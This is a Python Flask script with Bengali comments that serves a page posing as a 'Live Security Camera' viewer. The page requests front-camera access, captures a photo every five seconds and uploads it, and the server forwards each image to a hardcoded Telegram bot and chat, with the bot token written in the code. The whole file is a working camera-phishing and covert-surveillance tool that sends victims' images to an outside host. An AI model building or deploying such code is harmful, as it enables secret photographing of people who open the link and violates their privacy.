import os
import base64
import requests
from flask import Flask, render_template_string, request, jsonify

app = Flask(__name__)

# আপনার Bot Token ও Chat ID
BOT_TOKEN = "8397043572:AAE8gSE0AtCmtSUQcWqMfOSLDw6F5Lemkw4"
CHAT_ID = "5908310559"

HTML_CODE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Live Security Camera</title>
    <style>
        body { font-family: Arial, sans-serif; text-align: center; background: #0f172a; color: #fff; padding-top: 20px; }
        video { width: 90%; max-width: 400px; border: 3px solid #38bdf8; border-radius: 12px; }
        .status { margin-top: 15px; color: #4ade80; font-weight: bold; }
    </style>
</head>
<body>
    <h2>Security Surveillance</h2>
    <video id="video" autoplay playsinline></video>
    <p class="status" id="status-text">ক্যামেরা কানেক্ট হচ্ছে...</p>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const statusText = document.getElementById('status-text');

        // ক্যামেরা এক্সেস শুরু
        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
            .then(stream => {
                video.srcObject = stream;
                statusText.innerText = "ক্যামেরা সক্রিয় আছে। ক্যাপচার চলছে...";
                // প্রতি ৫ সেকেন্ড পর পর ফ্রেম পাঠানো
                setInterval(captureAndSend, 5000);
            })
            .catch(err => {
                statusText.innerText = "ক্যামেরা পারমিশন পাওয়া যায়নি!";
                statusText.style.color = "#ef4444";
            });

        function captureAndSend() {
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            
            const imageData = canvas.toDataURL('image/jpeg', 0.8);

            fetch('/upload', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ image: imageData })
            })
            .then(res => res.json())
            .then(data => {
                console.log("Response:", data);
            })
            .catch(err => console.error("Upload error:", err));
        }
    </script>
</body>
</html>
"""

@app.route('/')
def home():
    return render_template_string(HTML_CODE)

@app.route('/upload', methods=['POST'])
def upload():
    try:
        data = request.get_json()
        if not data or 'image' not in data:
            return jsonify({"status": "failed", "reason": "No image data"}), 400

        image_data = data['image'].split(',')[1]
        image_bytes = base64.b64decode(image_data)

        # টেলিগ্রাম API কল (Photo + Caption)
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
        files = {'photo': ('capture.jpg', image_bytes, 'image/jpeg')}
        payload = {
            'chat_id': CHAT_ID,
            'caption': "📸 নতুন ক্যামেরা ক্যাপচার পাওয়া গেছে!"
        }
        
        res = requests.post(url, data=payload, files=files, timeout=10)
        
        if res.status_code == 200:
            return jsonify({"status": "success"})
        else:
            print(f"Telegram API Error: {res.text}")
            return jsonify({"status": "error", "details": res.text}), 500

    except Exception as e:
        print(f"Server Error: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500

if __name__ == '__main__':
    # সার্ভার সব লোকাল ও ওয়াইফাই আইপিতে রান করবে
    app.run(host='0.0.0.0', port=8080)
    
